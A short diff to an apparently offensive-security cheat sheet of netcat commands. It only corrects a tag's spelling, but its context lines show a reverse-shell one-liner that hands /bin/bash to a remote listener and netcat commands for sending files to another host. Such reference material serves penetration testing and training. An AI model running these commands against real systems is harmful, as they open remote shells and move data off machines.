@@ -33,13 +33,13 @@ nc -nv <ip> <port> -e /bin/bash
 ```
 
 ## nc transfer file - receiver
-#platform/linux #cat/ATTACK/FILE_TRANSFERT 
+#platform/linux #cat/ATTACK/FILE_TRANSFER 
 ```
 nc -nlvp <port> > <incomming_file>
 ```
 
 ## nc transfer file - sender
-#platform/linux #cat/ATTACK/FILE_TRANSFERT 
+#platform/linux #cat/ATTACK/FILE_TRANSFER 
 ```
 nc -nv <ip> <port> < <file_to_send>
 ```
